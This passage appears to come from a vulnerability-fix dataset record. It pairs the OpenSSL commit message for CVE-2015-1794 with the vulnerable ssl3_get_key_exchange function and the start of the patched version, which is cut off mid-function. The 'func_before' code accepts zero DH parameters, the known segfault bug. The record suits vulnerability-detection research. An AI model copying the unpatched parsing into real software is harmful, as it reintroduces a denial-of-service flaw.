        "commit_text": "Fix seg fault with 0 p val in SKE  If a client receives a ServerKeyExchange for an anon DH ciphersuite with the value of p set to 0 then a seg fault can occur. This commits adds a test to reject p, g and pub key parameters that have a 0 value (in accordance with RFC 5246)  The security vulnerability only affects master and 1.0.2, but the fix is additionally applied to 1.0.1 for additional confidence.  CVE-2015-1794  ",
        "func_before": "int ssl3_get_key_exchange(SSL *s)\n{\n#ifndef OPENSSL_NO_RSA\n    unsigned char *q, md_buf[EVP_MAX_MD_SIZE * 2];\n#endif\n    EVP_MD_CTX md_ctx;\n    unsigned char *param, *p;\n    int al, j, ok;\n    long i, param_len, n, alg_k, alg_a;\n    EVP_PKEY *pkey = NULL;\n    const EVP_MD *md = NULL;\n#ifndef OPENSSL_NO_RSA\n    RSA *rsa = NULL;\n#endif\n#ifndef OPENSSL_NO_DH\n    DH *dh = NULL;\n#endif\n#ifndef OPENSSL_NO_ECDH\n    EC_KEY *ecdh = NULL;\n    BN_CTX *bn_ctx = NULL;\n    EC_POINT *srvr_ecpoint = NULL;\n    int curve_nid = 0;\n    int encoded_pt_len = 0;\n#endif\n\n    EVP_MD_CTX_init(&md_ctx);\n\n    /*\n     * use same message size as in ssl3_get_certificate_request() as\n     * ServerKeyExchange message may be skipped\n     */\n    n = s->method->ssl_get_message(s,\n                                   SSL3_ST_CR_KEY_EXCH_A,\n                                   SSL3_ST_CR_KEY_EXCH_B,\n                                   -1, s->max_cert_list, &ok);\n    if (!ok)\n        return ((int)n);\n\n    alg_k = s->s3->tmp.new_cipher->algorithm_mkey;\n\n    if (s->s3->tmp.message_type != SSL3_MT_SERVER_KEY_EXCHANGE) {\n        /*\n         * Can't skip server key exchange if this is an ephemeral\n         * ciphersuite.\n         */\n        if (alg_k & (SSL_kDHE | SSL_kECDHE)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_UNEXPECTED_MESSAGE);\n            al = SSL_AD_UNEXPECTED_MESSAGE;\n            goto f_err;\n        }\n#ifndef OPENSSL_NO_PSK\n        /*\n         * In plain PSK ciphersuite, ServerKeyExchange can be omitted if no\n         * identity hint is sent. Set session->sess_cert anyway to avoid\n         * problems later.\n         */\n        if (alg_k & SSL_kPSK) {\n            s->session->sess_cert = ssl_sess_cert_new();\n            if (s->ctx->psk_identity_hint)\n                OPENSSL_free(s->ctx->psk_identity_hint);\n            s->ctx->psk_identity_hint = NULL;\n        }\n#endif\n        s->s3->tmp.reuse_message = 1;\n        return (1);\n    }\n\n    param = p = (unsigned char *)s->init_msg;\n    if (s->session->sess_cert != NULL) {\n#ifndef OPENSSL_NO_RSA\n        if (s->session->sess_cert->peer_rsa_tmp != NULL) {\n            RSA_free(s->session->sess_cert->peer_rsa_tmp);\n            s->session->sess_cert->peer_rsa_tmp = NULL;\n        }\n#endif\n#ifndef OPENSSL_NO_DH\n        if (s->session->sess_cert->peer_dh_tmp) {\n            DH_free(s->session->sess_cert->peer_dh_tmp);\n            s->session->sess_cert->peer_dh_tmp = NULL;\n        }\n#endif\n#ifndef OPENSSL_NO_ECDH\n        if (s->session->sess_cert->peer_ecdh_tmp) {\n            EC_KEY_free(s->session->sess_cert->peer_ecdh_tmp);\n            s->session->sess_cert->peer_ecdh_tmp = NULL;\n        }\n#endif\n    } else {\n        s->session->sess_cert = ssl_sess_cert_new();\n    }\n\n    /* Total length of the parameters including the length prefix */\n    param_len = 0;\n\n    alg_a = s->s3->tmp.new_cipher->algorithm_auth;\n\n    al = SSL_AD_DECODE_ERROR;\n\n#ifndef OPENSSL_NO_PSK\n    if (alg_k & SSL_kPSK) {\n        param_len = 2;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n\n        /*\n         * Store PSK identity hint for later use, hint is used in\n         * ssl3_send_client_key_exchange.  Assume that the maximum length of\n         * a PSK identity hint can be as long as the maximum length of a PSK\n         * identity.\n         */\n        if (i > PSK_MAX_IDENTITY_LEN) {\n            al = SSL_AD_HANDSHAKE_FAILURE;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_DATA_LENGTH_TOO_LONG);\n            goto f_err;\n        }\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE,\n                   SSL_R_BAD_PSK_IDENTITY_HINT_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        s->session->psk_identity_hint = BUF_strndup((char *)p, i);\n        if (s->session->psk_identity_hint == NULL) {\n            al = SSL_AD_HANDSHAKE_FAILURE;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_MALLOC_FAILURE);\n            goto f_err;\n        }\n\n        p += i;\n        n -= param_len;\n    } else\n#endif                          /* !OPENSSL_NO_PSK */\n#ifndef OPENSSL_NO_SRP\n    if (alg_k & SSL_kSRP) {\n        param_len = 2;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_N_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(s->srp_ctx.N = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_G_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(s->srp_ctx.g = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (1 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 1;\n\n        i = (unsigned int)(p[0]);\n        p++;\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_S_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(s->srp_ctx.s = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_B_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(s->srp_ctx.B = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n        n -= param_len;\n\n        if (!srp_verify_server_param(s, &al)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_PARAMETERS);\n            goto f_err;\n        }\n\n/* We must check if there is a certificate */\n# ifndef OPENSSL_NO_RSA\n        if (alg_a & SSL_aRSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_RSA_ENC].x509);\n# else\n        if (0) ;\n# endif\n# ifndef OPENSSL_NO_DSA\n        else if (alg_a & SSL_aDSS)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_DSA_SIGN].\n                                x509);\n# endif\n    } else\n#endif                          /* !OPENSSL_NO_SRP */\n#ifndef OPENSSL_NO_RSA\n    if (alg_k & SSL_kRSA) {\n        /* Temporary RSA keys only allowed in export ciphersuites */\n        if (!SSL_C_IS_EXPORT(s->s3->tmp.new_cipher)) {\n            al = SSL_AD_UNEXPECTED_MESSAGE;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_UNEXPECTED_MESSAGE);\n            goto f_err;\n        }\n        if ((rsa = RSA_new()) == NULL) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_MALLOC_FAILURE);\n            goto err;\n        }\n\n        param_len = 2;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_RSA_MODULUS_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(rsa->n = BN_bin2bn(p, i, rsa->n))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_RSA_E_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(rsa->e = BN_bin2bn(p, i, rsa->e))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n        n -= param_len;\n\n        /* this should be because we are using an export cipher */\n        if (alg_a & SSL_aRSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_RSA_ENC].x509);\n        else {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_INTERNAL_ERROR);\n            goto err;\n        }\n\n        if (EVP_PKEY_bits(pkey) <= SSL_C_EXPORT_PKEYLENGTH(s->s3->tmp.new_cipher)) {\n            al = SSL_AD_UNEXPECTED_MESSAGE;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_UNEXPECTED_MESSAGE);\n            goto f_err;\n        }\n\n        s->session->sess_cert->peer_rsa_tmp = rsa;\n        rsa = NULL;\n    }\n#else                           /* OPENSSL_NO_RSA */\n    if (0) ;\n#endif\n#ifndef OPENSSL_NO_DH\n    else if (alg_k & SSL_kEDH) {\n        if ((dh = DH_new()) == NULL) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_DH_LIB);\n            goto err;\n        }\n\n        param_len = 2;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_P_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(dh->p = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_G_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(dh->g = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_DH_PUB_KEY_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(dh->pub_key = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n        n -= param_len;\n\n# ifndef OPENSSL_NO_RSA\n        if (alg_a & SSL_aRSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_RSA_ENC].x509);\n# else\n        if (0) ;\n# endif\n# ifndef OPENSSL_NO_DSA\n        else if (alg_a & SSL_aDSS)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_DSA_SIGN].\n                                x509);\n# endif\n        /* else anonymous DH, so no certificate or pkey. */\n\n        s->session->sess_cert->peer_dh_tmp = dh;\n        dh = NULL;\n    } else if ((alg_k & SSL_kDHr) || (alg_k & SSL_kDHd)) {\n        al = SSL_AD_ILLEGAL_PARAMETER;\n        SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE,\n               SSL_R_TRIED_TO_USE_UNSUPPORTED_CIPHER);\n        goto f_err;\n    }\n#endif                          /* !OPENSSL_NO_DH */\n\n#ifndef OPENSSL_NO_ECDH\n    else if (alg_k & SSL_kEECDH) {\n        EC_GROUP *ngroup;\n        const EC_GROUP *group;\n\n        if ((ecdh = EC_KEY_new()) == NULL) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_MALLOC_FAILURE);\n            goto err;\n        }\n\n        /*\n         * Extract elliptic curve parameters and the server's ephemeral ECDH\n         * public key. Keep accumulating lengths of various components in\n         * param_len and make sure it never exceeds n.\n         */\n\n        /*\n         * XXX: For now we only support named (not generic) curves and the\n         * ECParameters in this case is just three bytes. We also need one\n         * byte for the length of the encoded point\n         */\n        param_len = 4;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        /*\n         * Check curve is one of our preferences, if not server has sent an\n         * invalid curve. ECParameters is 3 bytes.\n         */\n        if (!tls1_check_curve(s, p, 3)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_WRONG_CURVE);\n            goto f_err;\n        }\n\n        if ((curve_nid = tls1_ec_curve_id2nid(*(p + 2))) == 0) {\n            al = SSL_AD_INTERNAL_ERROR;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE,\n                   SSL_R_UNABLE_TO_FIND_ECDH_PARAMETERS);\n            goto f_err;\n        }\n\n        ngroup = EC_GROUP_new_by_curve_name(curve_nid);\n        if (ngroup == NULL) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_EC_LIB);\n            goto err;\n        }\n        if (EC_KEY_set_group(ecdh, ngroup) == 0) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_EC_LIB);\n            goto err;\n        }\n        EC_GROUP_free(ngroup);\n\n        group = EC_KEY_get0_group(ecdh);\n\n        if (SSL_C_IS_EXPORT(s->s3->tmp.new_cipher) &&\n            (EC_GROUP_get_degree(group) > 163)) {\n            al = SSL_AD_EXPORT_RESTRICTION;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE,\n                   SSL_R_ECGROUP_TOO_LARGE_FOR_CIPHER);\n            goto f_err;\n        }\n\n        p += 3;\n\n        /* Next, get the encoded ECPoint */\n        if (((srvr_ecpoint = EC_POINT_new(group)) == NULL) ||\n            ((bn_ctx = BN_CTX_new()) == NULL)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_MALLOC_FAILURE);\n            goto err;\n        }\n\n        encoded_pt_len = *p;    /* length of encoded point */\n        p += 1;\n\n        if ((encoded_pt_len > n - param_len) ||\n            (EC_POINT_oct2point(group, srvr_ecpoint,\n                                p, encoded_pt_len, bn_ctx) == 0)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_ECPOINT);\n            goto f_err;\n        }\n        param_len += encoded_pt_len;\n\n        n -= param_len;\n        p += encoded_pt_len;\n\n        /*\n         * The ECC/TLS specification does not mention the use of DSA to sign\n         * ECParameters in the server key exchange message. We do support RSA\n         * and ECDSA.\n         */\n        if (0) ;\n# ifndef OPENSSL_NO_RSA\n        else if (alg_a & SSL_aRSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_RSA_ENC].x509);\n# endif\n# ifndef OPENSSL_NO_ECDSA\n        else if (alg_a & SSL_aECDSA)\n            pkey =\n                X509_get_pubkey(s->session->\n                                sess_cert->peer_pkeys[SSL_PKEY_ECC].x509);\n# endif\n        /* else anonymous ECDH, so no certificate or pkey. */\n        EC_KEY_set_public_key(ecdh, srvr_ecpoint);\n        s->session->sess_cert->peer_ecdh_tmp = ecdh;\n        ecdh = NULL;\n        BN_CTX_free(bn_ctx);\n        bn_ctx = NULL;\n        EC_POINT_free(srvr_ecpoint);\n        srvr_ecpoint = NULL;\n    } else if (alg_k) {\n        al = SSL_AD_UNEXPECTED_MESSAGE;\n        SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_UNEXPECTED_MESSAGE);\n        goto f_err;\n    }\n#endif                          /* !OPENSSL_NO_ECDH */\n\n    /* p points to the next byte, there are 'n' bytes left */\n\n    /* if it was signed, check the signature */\n    if (pkey != NULL) {\n        if (SSL_USE_SIGALGS(s)) {\n            int rv;\n            if (2 > n) {\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n                goto f_err;\n            }\n            rv = tls12_check_peer_sigalg(&md, s, p, pkey);\n            if (rv == -1)\n                goto err;\n            else if (rv == 0) {\n                goto f_err;\n            }\n#ifdef SSL_DEBUG\n            fprintf(stderr, \"USING TLSv1.2 HASH %s\\n\", EVP_MD_name(md));\n#endif\n            p += 2;\n            n -= 2;\n        } else\n            md = EVP_sha1();\n\n        if (2 > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n        n -= 2;\n        j = EVP_PKEY_size(pkey);\n\n        /*\n         * Check signature length. If n is 0 then signature is empty\n         */\n        if ((i != n) || (n > j) || (n <= 0)) {\n            /* wrong packet length */\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_WRONG_SIGNATURE_LENGTH);\n            goto f_err;\n        }\n#ifndef OPENSSL_NO_RSA\n        if (pkey->type == EVP_PKEY_RSA && !SSL_USE_SIGALGS(s)) {\n            int num;\n            unsigned int size;\n\n            j = 0;\n            q = md_buf;\n            for (num = 2; num > 0; num--) {\n                EVP_MD_CTX_set_flags(&md_ctx, EVP_MD_CTX_FLAG_NON_FIPS_ALLOW);\n                EVP_DigestInit_ex(&md_ctx, (num == 2)\n                                  ? s->ctx->md5 : s->ctx->sha1, NULL);\n                EVP_DigestUpdate(&md_ctx, &(s->s3->client_random[0]),\n                                 SSL3_RANDOM_SIZE);\n                EVP_DigestUpdate(&md_ctx, &(s->s3->server_random[0]),\n                                 SSL3_RANDOM_SIZE);\n                EVP_DigestUpdate(&md_ctx, param, param_len);\n                EVP_DigestFinal_ex(&md_ctx, q, &size);\n                q += size;\n                j += size;\n            }\n            i = RSA_verify(NID_md5_sha1, md_buf, j, p, n, pkey->pkey.rsa);\n            if (i < 0) {\n                al = SSL_AD_DECRYPT_ERROR;\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_RSA_DECRYPT);\n                goto f_err;\n            }\n            if (i == 0) {\n                /* bad signature */\n                al = SSL_AD_DECRYPT_ERROR;\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SIGNATURE);\n                goto f_err;\n            }\n        } else\n#endif\n        {\n            EVP_VerifyInit_ex(&md_ctx, md, NULL);\n            EVP_VerifyUpdate(&md_ctx, &(s->s3->client_random[0]),\n                             SSL3_RANDOM_SIZE);\n            EVP_VerifyUpdate(&md_ctx, &(s->s3->server_random[0]),\n                             SSL3_RANDOM_SIZE);\n            EVP_VerifyUpdate(&md_ctx, param, param_len);\n            if (EVP_VerifyFinal(&md_ctx, p, (int)n, pkey) <= 0) {\n                /* bad signature */\n                al = SSL_AD_DECRYPT_ERROR;\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SIGNATURE);\n                goto f_err;\n            }\n        }\n    } else {\n        /* aNULL, aSRP or kPSK do not need public keys */\n        if (!(alg_a & (SSL_aNULL | SSL_aSRP)) && !(alg_k & SSL_kPSK)) {\n            /* Might be wrong key type, check it */\n            if (ssl3_check_cert_and_algorithm(s))\n                /* Otherwise this shouldn't happen */\n                SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_INTERNAL_ERROR);\n            goto err;\n        }\n        /* still data left over */\n        if (n != 0) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_EXTRA_DATA_IN_MESSAGE);\n            goto f_err;\n        }\n    }\n    EVP_PKEY_free(pkey);\n    EVP_MD_CTX_cleanup(&md_ctx);\n    return (1);\n f_err:\n    ssl3_send_alert(s, SSL3_AL_FATAL, al);\n err:\n    EVP_PKEY_free(pkey);\n#ifndef OPENSSL_NO_RSA\n    if (rsa != NULL)\n        RSA_free(rsa);\n#endif\n#ifndef OPENSSL_NO_DH\n    if (dh != NULL)\n        DH_free(dh);\n#endif\n#ifndef OPENSSL_NO_ECDH\n    BN_CTX_free(bn_ctx);\n    EC_POINT_free(srvr_ecpoint);\n    if (ecdh != NULL)\n        EC_KEY_free(ecdh);\n#endif\n    EVP_MD_CTX_cleanup(&md_ctx);\n    s->state = SSL_ST_ERR;\n    return (-1);\n}",
        "func": "int ssl3_get_key_exchange(SSL *s)\n{\n#ifndef OPENSSL_NO_RSA\n    unsigned char *q, md_buf[EVP_MAX_MD_SIZE * 2];\n#endif\n    EVP_MD_CTX md_ctx;\n    unsigned char *param, *p;\n    int al, j, ok;\n    long i, param_len, n, alg_k, alg_a;\n    EVP_PKEY *pkey = NULL;\n    const EVP_MD *md = NULL;\n#ifndef OPENSSL_NO_RSA\n    RSA *rsa = NULL;\n#endif\n#ifndef OPENSSL_NO_DH\n    DH *dh = NULL;\n#endif\n#ifndef OPENSSL_NO_ECDH\n    EC_KEY *ecdh = NULL;\n    BN_CTX *bn_ctx = NULL;\n    EC_POINT *srvr_ecpoint = NULL;\n    int curve_nid = 0;\n    int encoded_pt_len = 0;\n#endif\n\n    EVP_MD_CTX_init(&md_ctx);\n\n    /*\n     * use same message size as in ssl3_get_certificate_request() as\n     * ServerKeyExchange message may be skipped\n     */\n    n = s->method->ssl_get_message(s,\n                                   SSL3_ST_CR_KEY_EXCH_A,\n                                   SSL3_ST_CR_KEY_EXCH_B,\n                                   -1, s->max_cert_list, &ok);\n    if (!ok)\n        return ((int)n);\n\n    alg_k = s->s3->tmp.new_cipher->algorithm_mkey;\n\n    if (s->s3->tmp.message_type != SSL3_MT_SERVER_KEY_EXCHANGE) {\n        /*\n         * Can't skip server key exchange if this is an ephemeral\n         * ciphersuite.\n         */\n        if (alg_k & (SSL_kDHE | SSL_kECDHE)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_UNEXPECTED_MESSAGE);\n            al = SSL_AD_UNEXPECTED_MESSAGE;\n            goto f_err;\n        }\n#ifndef OPENSSL_NO_PSK\n        /*\n         * In plain PSK ciphersuite, ServerKeyExchange can be omitted if no\n         * identity hint is sent. Set session->sess_cert anyway to avoid\n         * problems later.\n         */\n        if (alg_k & SSL_kPSK) {\n            s->session->sess_cert = ssl_sess_cert_new();\n            if (s->ctx->psk_identity_hint)\n                OPENSSL_free(s->ctx->psk_identity_hint);\n            s->ctx->psk_identity_hint = NULL;\n        }\n#endif\n        s->s3->tmp.reuse_message = 1;\n        return (1);\n    }\n\n    param = p = (unsigned char *)s->init_msg;\n    if (s->session->sess_cert != NULL) {\n#ifndef OPENSSL_NO_RSA\n        if (s->session->sess_cert->peer_rsa_tmp != NULL) {\n            RSA_free(s->session->sess_cert->peer_rsa_tmp);\n            s->session->sess_cert->peer_rsa_tmp = NULL;\n        }\n#endif\n#ifndef OPENSSL_NO_DH\n        if (s->session->sess_cert->peer_dh_tmp) {\n            DH_free(s->session->sess_cert->peer_dh_tmp);\n            s->session->sess_cert->peer_dh_tmp = NULL;\n        }\n#endif\n#ifndef OPENSSL_NO_ECDH\n        if (s->session->sess_cert->peer_ecdh_tmp) {\n            EC_KEY_free(s->session->sess_cert->peer_ecdh_tmp);\n            s->session->sess_cert->peer_ecdh_tmp = NULL;\n        }\n#endif\n    } else {\n        s->session->sess_cert = ssl_sess_cert_new();\n    }\n\n    /* Total length of the parameters including the length prefix */\n    param_len = 0;\n\n    alg_a = s->s3->tmp.new_cipher->algorithm_auth;\n\n    al = SSL_AD_DECODE_ERROR;\n\n#ifndef OPENSSL_NO_PSK\n    if (alg_k & SSL_kPSK) {\n        param_len = 2;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n\n        /*\n         * Store PSK identity hint for later use, hint is used in\n         * ssl3_send_client_key_exchange.  Assume that the maximum length of\n         * a PSK identity hint can be as long as the maximum length of a PSK\n         * identity.\n         */\n        if (i > PSK_MAX_IDENTITY_LEN) {\n            al = SSL_AD_HANDSHAKE_FAILURE;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_DATA_LENGTH_TOO_LONG);\n            goto f_err;\n        }\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE,\n                   SSL_R_BAD_PSK_IDENTITY_HINT_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        s->session->psk_identity_hint = BUF_strndup((char *)p, i);\n        if (s->session->psk_identity_hint == NULL) {\n            al = SSL_AD_HANDSHAKE_FAILURE;\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_MALLOC_FAILURE);\n            goto f_err;\n        }\n\n        p += i;\n        n -= param_len;\n    } else\n#endif                          /* !OPENSSL_NO_PSK */\n#ifndef OPENSSL_NO_SRP\n    if (alg_k & SSL_kSRP) {\n        param_len = 2;\n        if (param_len > n) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_N_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(s->srp_ctx.N = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_G_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(s->srp_ctx.g = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (1 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 1;\n\n        i = (unsigned int)(p[0]);\n        p++;\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_S_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(s->srp_ctx.s = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n\n        if (2 > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_LENGTH_TOO_SHORT);\n            goto f_err;\n        }\n        param_len += 2;\n\n        n2s(p, i);\n\n        if (i > n - param_len) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_B_LENGTH);\n            goto f_err;\n        }\n        param_len += i;\n\n        if (!(s->srp_ctx.B = BN_bin2bn(p, i, NULL))) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, ERR_R_BN_LIB);\n            goto err;\n        }\n        p += i;\n        n -= param_len;\n\n        if (!srp_verify_server_param(s, &al)) {\n            SSLerr(SSL_F_SSL3_GET_KEY_EXCHANGE, SSL_R_BAD_SRP_PARAMETERS);\n            goto f_err;\n        